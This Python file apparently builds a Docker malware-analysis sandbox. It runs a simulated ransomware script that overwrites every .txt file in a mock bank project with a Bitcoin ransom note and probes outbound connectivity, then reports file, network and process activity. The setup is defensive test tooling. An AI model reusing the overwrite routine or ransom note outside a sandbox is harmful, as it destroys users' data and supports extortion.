import docker
import os

os.environ["DOCKER_BUILDKIT"] = "1"

class SandboxManager:
    def __init__(self):
        self.client = docker.from_env()
        self.container = None
        self.image_name = "malware-sandbox-image"
        self.container_name = "Nexus_Malware_Sandbox"

    def _safe_cleanup(self):
        try:
            old = self.client.containers.get(self.container_name)
            old.stop()
            old.remove()
        except:
            pass

    def build_and_start(self):
        try:
            self._safe_cleanup()
            self.client.images.build(path=".", tag=self.image_name, rm=True, forcerm=True)
            self.container = self.client.containers.run(
                self.image_name,
                name=self.container_name, 
                detach=True,
                tty=True
            )
            monitor_cmd = "nohup inotifywait -m -r -e modify,create,delete /sandbox/bank-project/ > /sandbox/fs_monitor.log 2>&1 &"
            self.container.exec_run(['sh', '-c', monitor_cmd])
            return f"Sandbox running: {self.container.short_id}"
        except Exception as e:
            return str(e)

    def run_malware_test(self):
        try:
            self.container = self.client.containers.get(self.container_name)
        except:
            return "Sandbox not running"
        
        malware_script = """
import os
import urllib.request

note = '''========================================
!!! WARNING: YOU HAVE BEEN HACKED !!!
========================================
All sensitive data, including passwords and crypto wallets, has been stolen and encrypted.

To prevent the public release of your private keys and financial data, you must send $4,000,000 USD in Bitcoin to the following address:
bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

If payment is not received within 48 hours, your data will be published on the dark web.'''

try:
    urllib.request.urlopen('http://google.com', timeout=2)
    with open('/sandbox/network_activity.log', 'w') as f:
        f.write('Malware established outbound network connection to external IP.')
except:
    pass

for root, dirs, files in os.walk('/sandbox/bank-project/'):
    for file in files:
        if file.endswith('.txt'):
            filepath = os.path.join(root, file)
            try:
                with open(filepath, 'w') as f:
                    f.write(note)
            except:
                pass
"""
        try:
            self.container.exec_run(['python3', '-c', malware_script])
            return "Malware executed successfully"
        except Exception as e:
            return str(e)

    def generate_report(self):
        try:
            self.container = self.client.containers.get(self.container_name)
            
            fs_log = self.container.exec_run(['cat', '/sandbox/fs_monitor.log']).output.decode('utf-8').strip()
            ps_log = self.container.exec_run(['ps', 'aux']).output.decode('utf-8').strip()
            
            net_res = self.container.exec_run(['cat', '/sandbox/network_activity.log'])
            net_log = net_res.output.decode('utf-8').strip() if net_res.exit_code == 0 else "No network activity logged."

            report = "=== MALWARE ANALYSIS REPORT ===\n\n"
            
            report += "[FILE SYSTEM MODIFICATIONS]\n"
            report += (fs_log if fs_log else "No file system changes detected.") + "\n\n"
            
            report += "[NETWORK ACTIVITY]\n"
            report += net_log + "\n\n"
            
            report += "[PROCESS ACTIVITY SNAPSHOT]\n"
            report += ps_log + "\n"
            
            return report
        except Exception as e:
            return str(e)

    def stop_sandbox(self):
        try:
            self._safe_cleanup()
            self.container = None
            return "Sandbox stopped and cleaned up"
        except Exception as e:
            return str(e)